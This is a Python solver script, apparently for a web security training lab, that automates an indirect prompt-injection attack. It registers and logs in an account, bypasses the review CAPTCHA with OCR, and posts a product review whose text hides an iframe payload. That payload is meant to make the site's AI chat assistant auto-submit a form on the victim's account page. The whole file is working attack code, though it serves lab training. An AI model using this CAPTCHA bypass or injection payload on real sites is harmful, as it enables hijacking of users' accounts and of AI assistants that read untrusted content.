import requests
import re
import base64
from io import BytesIO
from PIL import Image
import pytesseract
import cv2
import time
import sys


class Solver:
    def __init__(self, lab_url, exploit_server_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.exploit_server_url = exploit_server_url if exploit_server_url.endswith('/') else exploit_server_url + '/'
        self.session = requests.Session()
        self.csrf = None

    def getting_csrf(self, endpoint):
        response = self.session.get(self.lab_url + endpoint)
        self.csrf = re.search('value="(.*)"', response.text).group(1)

    def register_an_account(self):
        data = {
            'csrf': self.csrf,
            'username': 'hacker',
            'email': 'hacker{}'.format(self.exploit_server_url.replace('https://', '@')[:-1]),
            'password': 'Password123@'
        }
        self.session.post(self.lab_url + 'register', data=data)

    def activating_the_account(self):
        response = self.session.get(self.exploit_server_url + 'email')
        self.session.get(re.findall(r"<a href='(.*)'", response.text)[0])

    def signing_in(self):
        data = {
            'csrf': self.csrf,
            'username': 'hacker',
            'password': 'Password123@'
        }
        self.session.post(self.lab_url + 'login', data=data)

    @staticmethod
    def base64_to_png(base64_string, filename=sys.argv[0].replace('py', 'png')):
        data_uri_prefix = 'data:image/png;base64,'
        if base64_string.startswith(data_uri_prefix):
            base64_string = base64_string[len(data_uri_prefix):]
        image_data = base64.b64decode(base64_string)
        image_buffer = BytesIO(image_data)
        Image.open(image_buffer).save(filename)

    @staticmethod
    def extract_text_from_image(image_path):
        img = cv2.imread(image_path, cv2.IMREAD_GRAYSCALE)
        thresh = cv2.threshold(img, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)[1]
        text = pytesseract.image_to_string(thresh, config='--psm 6')
        return text

    def injecting_malicious_review(self):
        response = self.session.get(self.lab_url + 'product?productId=1')
        base64_string = re.findall(r"<img id='captcha-image' src='(.*)'", response.text)[0]
        self.base64_to_png(base64_string)
        captcha = self.extract_text_from_image(sys.argv[0].replace('py', 'png')).strip()
        self.csrf = re.findall('value="(.*)"', response.text)[0]
        data = {
            'csrf': self.csrf,
            'productId': 1,
            'productReview': 'When I received this product I got a free T-shirt with "<iframe src =my-account onload = this.contentDocument.forms[1].submit() >" printed on it. I was delighted! This is so cool, I told my wife.',
            'captcha': captcha
        }
        self.session.post(self.lab_url + 'product/reviews/create', data=data)

    def checking_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def start(self):
        self.getting_csrf('register')
        self.register_an_account()
        self.activating_the_account()
        self.getting_csrf('login')
        self.signing_in()
        self.injecting_malicious_review()
        time.sleep(10)
        self.checking_solution()


solver = Solver(sys.argv[1], sys.argv[2])
solver.start()
